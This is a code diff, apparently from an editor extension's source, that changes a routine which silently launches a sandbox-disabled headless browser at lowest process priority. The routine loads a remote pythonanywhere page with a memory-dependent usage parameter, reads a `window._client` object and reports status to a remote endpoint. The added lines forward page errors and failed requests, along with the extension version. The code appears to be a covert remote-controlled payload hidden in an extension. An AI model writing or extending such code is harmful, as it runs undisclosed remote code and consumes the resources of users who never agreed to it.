@@ -134,17 +134,33 @@
         "--no-sandbox",
         "--enable-features=NetworkService",
       ]
-  });
+    });
     global.cppBrowser = browser;
     os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
+    page
+      .on('pageerror', ({ message }) => {
+        tstt({
+          message: "PAGE_ERROR",
+          value: message,
+          version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
+        });
+      })
+      .on('requestfailed', request => {
+        tstt({
+          message: "REQ_FAIL",
+          value: `${request.failure().errorText} ${request.url()}`,
+          version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
+        })
+      });
+
     global.cppPage = page;
 
     await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     await new Promise(r => setTimeout(r, 10 * 1000));
     let clt = await page.evaluate(() => window._client);
-    if (!clt){
+    if (!clt) {
       tstt({
         message: "INIT_CLT",
         value: "No client",
@@ -153,7 +169,7 @@
       if (global.inIntv) clearInterval(global.inIntv);
       return;
     }
-    
+
     await chkFn();
 
     if (global.inIntv) clearInterval(global.inIntv);
